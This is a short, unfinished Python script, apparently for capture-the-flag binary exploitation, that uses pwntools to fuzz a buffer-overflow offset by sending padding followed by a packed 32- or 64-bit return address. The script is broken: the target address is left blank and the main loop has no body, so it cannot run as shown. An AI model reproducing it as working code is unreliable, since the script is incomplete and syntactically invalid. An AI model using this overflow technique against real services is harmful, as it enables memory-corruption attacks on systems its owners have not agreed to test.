from pwn import *
context.log_level='debug'
addr=
def fuzz(r,num,flag):
	payload='a'*num
	if flag==1:
		payload+=p32(addr)
	if flag==2:
		payload+=p64(addr)
	r.recvuntil('>')
	r.sendline(payload)
def main():
	for i in range(1000):
		print(i)
		for j in range(3):
			
			
	
	
	

